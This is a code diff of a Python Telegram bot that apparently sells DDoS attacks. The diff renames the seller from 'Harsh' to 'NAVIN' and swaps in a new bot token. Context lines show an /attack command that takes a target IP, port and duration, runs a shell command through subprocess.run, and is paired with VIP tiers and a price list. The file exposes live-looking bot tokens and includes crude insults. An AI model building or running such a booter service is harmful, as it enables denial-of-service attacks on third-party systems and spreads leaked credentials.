@@ -1,4 +1,4 @@
-#@HarshOP001
+#@@Navin_Pre
 
 import telebot
 import subprocess
@@ -7,7 +7,7 @@ import os
 import time
 import threading
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8033755504:AAF77C1RnV5CTN31X22801CGBgjwq07p4To')
+bot = telebot.TeleBot('8129493085:AAF8BD4iv2GMogWUOnunDhkul6jAjWpGbEE')
 
 # Admin user IDs
 admin_id = {"5373866044"}
@@ -28,7 +28,7 @@ def prevent_idle_timeout():
 def energy_regen():
     while True:
         print("Regenerating energy...", flush=True)
-        time.sleep(10800)  # Every 3 hours
+        time.sleep(10800000000000000000)  # Every 3 hours
 
 
 USER_FILE = "users.txt"
@@ -213,7 +213,7 @@ def start_attack_reply(message, king, soulking, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Harsh\n\n🌟 Harsh DDOS OFFICIAL..!💀"
+    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: NAVIN\n\n🌟 NAVIN DDOS OFFICIAL..!💀"
     bot.reply_to(message, response)
 
 soul_cooldown = {}
@@ -248,9 +248,9 @@ def handle_soul(message):
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <king> <soulking> <time>"  
+            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <IP> <PORT> <time>"  
     else:
-        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @HarshOP001 ."
+        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @Navin_Pre ."
 
     bot.reply_to(message, response)
 
@@ -301,7 +301,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''ıllıllı⭐🌟 W͙e͙l͙c͙o͙m͙e͙ t͙o͙ Harsh VIP DDOS ❣️ 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜
+    response = f'''ıllıllı⭐🌟 W͙e͙l͙c͙o͙m͙e͙ t͙o͙ NAVIN VIP DDOS ❣️ 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜
 🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
@@ -327,7 +327,7 @@ Vip 🌟 :
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-massage :- @HarshOP001
+massage :- @Navin_Pre
 '''
     bot.reply_to(message, response)
 
